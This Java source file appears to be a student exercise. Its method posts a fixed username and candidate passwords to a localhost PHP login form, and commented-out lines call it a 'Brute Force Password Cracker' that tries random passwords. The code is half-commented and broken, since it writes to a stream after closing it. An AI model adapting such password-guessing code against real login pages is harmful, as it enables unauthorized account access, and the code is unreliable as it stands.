
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Authentification3 {

	private static final String USER_AGENT = "Mozilla/5.0";

	private static final String POST_URL = "http://localhost/pageLogin/form.php";

	// public static void main(String[] args) throws IOException, InterruptedException {
	// 	System.out.println((char) 27 + "[31mWelcome to the java Brute Force Password Cracker!");
	// 	Thread.sleep(2500);
	// 	System.out.print((char) 27 + "[33m\nDEBUT DE L'ATTAQUE..... > ");
	// 	System.out.println();
	// 	sendPOST();

	// 	System.out.println((char) 27 + "[33m\n ATTAQUE TERMINEE..... > ");

	// }

	public static boolean authentificate3(String password) throws IOException {
		//String pass = "a";
		boolean find=false;
		String POST_PARAMS;
		URL obj = new URL(POST_URL);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setRequestProperty("User-Agent", USER_AGENT);

		// For POST only - START = "username=ismaila&password=" + pass;
		con.setDoOutput(true);

		OutputStream os = con.getOutputStream();
		int i = 10;
		while (con.getResponseCode() != HttpURLConnection.HTTP_OK) {
			POST_PARAMS = "username=moussa&password=" + password;
			os.write(POST_PARAMS.getBytes());
			os.flush();
			os.close();
			if (con.getURL().toString().equals("http://localhost/pageLogin/index.php")) {
               find = true;
			//if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
				break;}
				}
				return find;
		// 	} else {
		// 		pass = PasswordGenerator.generateRandomPassword();

		// 	}
		// 	System.out.println(POST_PARAMS);
		// 	System.out.println(con.getResponseCode());

		// }
		// if (con.getResponseCode() == HttpURLConnection.HTTP_OK) { // success
		// 	BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		// 	String inputLine;
		// 	StringBuffer response = new StringBuffer();

		// 	System.out.println("Mot de passe trouver:" + pass);
		// 	in.close();

		// 	System.out.println(response.toString());
		// } else {
		// 	System.out.println("Informations incorrects");
		// }
	}

}
